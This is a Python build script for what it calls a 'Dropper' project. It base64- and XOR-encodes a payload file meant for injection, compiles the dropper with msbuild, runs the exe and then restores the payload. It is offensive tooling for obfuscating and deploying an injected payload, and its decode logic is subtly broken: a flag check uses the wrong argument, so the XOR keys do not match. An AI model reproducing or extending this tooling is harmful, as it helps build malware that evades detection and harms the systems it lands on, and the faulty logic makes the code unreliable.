import os
import subprocess
import argparse
import base64

# converts the release/debug and x86/x64 into valid msbuild arguments then runs msbuild.
def run_msbuild(run_file_path, configuration_bool, x64_bool):

	if (configuration_bool == True):
		run_configuration_string = "/p:Configuration=Release"
		print("msbuild is compiling in release mode. ")
	else:
		run_configuration_string = "/p:Configuration=Debug"
		print("msbuild is compiling in debug mode. ")

	if (x64_bool == 64):
		run_architecture_string = "-p:Platform=x64"
		print("msbuild is compiling in x64 mode. ")
	elif (x64_bool == 86):
		run_architecture_string = "-p:Platform=x86"
		print("msbuild is compiling in x86 mode. ")
	else:	
		print("The --architecture flag only acccepts 64 or 86. This script will run msbuild in x86 mode.")
		run_architecture_string ="-p:Platform=x86"

	subprocess.run([
	"msbuild", 
	run_file_path,
	run_configuration_string,
	run_architecture_string
	])			


# This makes it so that the python file can take arguments.
def parse_args():
	parser = argparse.ArgumentParser(description="Look at msbuild_instructions.txt for how to run this program :D")
	parser.add_argument("--release", action="store_true")
	parser.add_argument("--architecture", type=int, default=64, required=True)
	parser.add_argument("--use-base64", action="store_true")
	parser.add_argument("--use-115-as-xor", action="store_true")
	parser.add_argument("--set-and-use-xor", type=int, default=0)
	parser.add_argument("--use-base64-and-xor-default", action="store_true")
	parser.add_argument("--use-hardcode", action="store_true")
	parser.add_argument("--use-logging", action="store_true")

	args = parser.parse_args()

	return args

def read_file_information_from_script_info(script_info, release_mode):
	file_information = {}

	print("The reading of script_info.txt requires that \"file_exe_path = \", \"file_payload_path = \", and \"file_path = \" are all formatted EXACTLY as seen.\n")
	with open(script_info, "r") as fr:
		for line in fr:
			line = line.strip("\n")
			line = line.strip("\t")
			if (release_mode == True):
				if (line.startswith("file_release_exe_path = ")):
					file_information["file_exe_path"] = line[24:]
					print(f"file_exe_path is: {line[24:]}")
			else:
				if (line.startswith("file_debug_exe_path = ")):
					file_information["file_exe_path"] = line[22:]
					print(f"file_exe_path is: {line[22:]}")
			if (line.startswith("file_payload_preserve_path = ")):
				file_information["file_payload_preserve_path"] = line[29:]
				print(f"file_payload_preserve_path is: {line[29:]}")
			if (line.startswith("file_payload_path = ")):
				file_information["file_payload_path"] = line[20:]
				print(f"file_payload_path is: {line[20:]}")
			if (line.startswith("file_path = ")):
				file_information["file_path"] = line[12:]
				print(f"file_path is: {line[12:]}")
	print("\n")
	return file_information

def base64_file(payload_file, encode, decode, payload_preserve_path, log_boolean):
	with open(payload_file, "r", encoding="utf-8") as file_read:
		payload = file_read.read()
		print("This is the original version (in the base64 function) of your payload: " + payload)

	payload_bytes = payload.encode("utf-8")

	if (encode):
		if (log_boolean == True):
			with open(payload_preserve_path, "a", encoding="utf-8") as file_preserve_read:
				string_before_payload_in_preserve_file = "This is what is preserved before applying base64 to the payload. "
				file_preserve_read.write(string_before_payload_in_preserve_file + payload + "\n\n")
				print("Original base64 input preserved.")

		encoded_payload_bytes = base64.b64encode(payload_bytes)
		encoded_payload = encoded_payload_bytes.decode("utf-8")
		print("This is the base64 encoded version of your payload: " + encoded_payload)
		with open(payload_file, "w", encoding="utf-8") as file_write:
			file_write.write(encoded_payload)

	if (decode):
		decoded_payload_bytes = base64.b64decode(payload_bytes)
		decoded_payload = decoded_payload_bytes.decode("utf-8")
		print("This is the base64 decoded version of your payload: " + decoded_payload)
		with open(payload_file, "w", encoding="utf-8") as file_write:
			file_write.write(decoded_payload)

def xor_file(payload_file, xor_key, encode, payload_preserve_path, log_boolean):

	with open(payload_file, "r", encoding="utf-8") as file_read: 
		payload = file_read.read()
		
	payload_bytes = payload.encode("utf-8")

	if (encode):
		if (log_boolean):
			with open(payload_preserve_path, "a", encoding="utf-8") as preserve_file_write:
				string_before_payload_in_preserve_file = "This is what is preserved before applying xor to the payload."
				message = string_before_payload_in_preserve_file + " " + payload + "\n\n"
				preserve_file_write.write(message)
				print("Original xor input preserved.")
	
	print("This is the original version of your payload: " + payload)
	encoded_payload = bytes([char ^ xor_key for char in payload_bytes])
	encoded_payload_bytes = encoded_payload.decode("utf-8")	

	print("This is the xor encoded or decoded version of your payload: " + encoded_payload_bytes)

	with open(payload_file, "w", encoding="utf-8") as file_write:

		file_write.write(encoded_payload_bytes)

	return payload_file

def run_program(run_file):
	if not os.path.isfile(run_file):
		print("The given exe was not found.")
	else:
		result = subprocess.run([run_file])
		print(f"The return code of the run file was {result.returncode}")

def main():	
	
	args = parse_args()
	script_info_location = r"C:\Users\adind\Dropper\Walmart-version-of-Dropper\script_info.txt"

	if (args.use_hardcode != True):
		file_path = input("Give the file path to the file you want to pass in to msbuild so that msbuild can compile it (should end in .vcxproj) : ")
		file_payload_path = input("Set the default file path to the payload that the dropper will inject: ")
		file_exe_path = input("Give the file path to the place where the exe will place after msbuild compiles it (should have an exe file extension): ")
		file_payload_preserve_path = input("Give the location of the file that will take the original contents of the payload file: ")

	else:
		script_dict = read_file_information_from_script_info(script_info_location, args.release)	
		file_path = script_dict.get("file_path")
		file_payload_path = script_dict.get("file_payload_path")
		file_exe_path = script_dict.get("file_exe_path")
		file_payload_preserve_path = script_dict.get("file_payload_preserve_path")

	if (file_exe_path == "" or file_payload_path == "" or file_path == "" or file_payload_preserve_path == ""):
		print("One or more of the variables in script_info.txt or the cmd line was blank.")
	else:
		with open(file_payload_preserve_path, "w", encoding="utf-8") as file_write:
			file_write.write("")
			print("file_payload_preserve_path has been reset.")


		if (args.use_base64 == True or args.use_base64_and_xor_default == True):
			encode = True
			decode = False
			base64_file(file_payload_path, encode, decode, file_payload_preserve_path, args.use_logging)

		if (args.use_115_as_xor == True or args.use_base64_and_xor_default == True):
			encode = True
			xor_file(file_payload_path, 115, encode, file_payload_preserve_path, args.use_logging)
			print("The xor key used is 115")
		else:
			if (args.set_and_use_xor > 255):
				print("This script only lets positive xor_keys up to 255. No more. The script will now handle the xor_key as 255.")
				args.set_and_use_xor = 255
			elif (args.set_and_use_xor < 0):
				print("This script only lets positive xor_keys up to 255. No more. The script will now handle the xor_key as 255.")
				args.set_and_use_xor = 255

			xor_file(file_payload_path, args.set_and_use_xor, True, file_payload_preserve_path, args.use_logging)
			print(f"This xor key used is {args.set_and_use_xor} \n")
		

		run_msbuild(file_path, args.release, args.architecture)

		run_program(file_exe_path)
		
		# decoding payload
		if (args.set_and_use_xor == True or args.use_base64_and_xor_default == True):
			xor_file(file_payload_path, 115, False, file_payload_preserve_path, args.use_logging)
			print("The xor key used is 115")
		else:
			xor_file(file_payload_path, args.set_and_use_xor, False, file_payload_preserve_path, args.use_logging)
			print(f"This xor key used is {args.set_and_use_xor} \n")
		
		if (args.use_base64 == True or args.use_base64_and_xor_default == True):
			encode = False
			decode = True
			base64_file(file_payload_path, encode, decode, file_payload_preserve_path, args.use_logging)

main()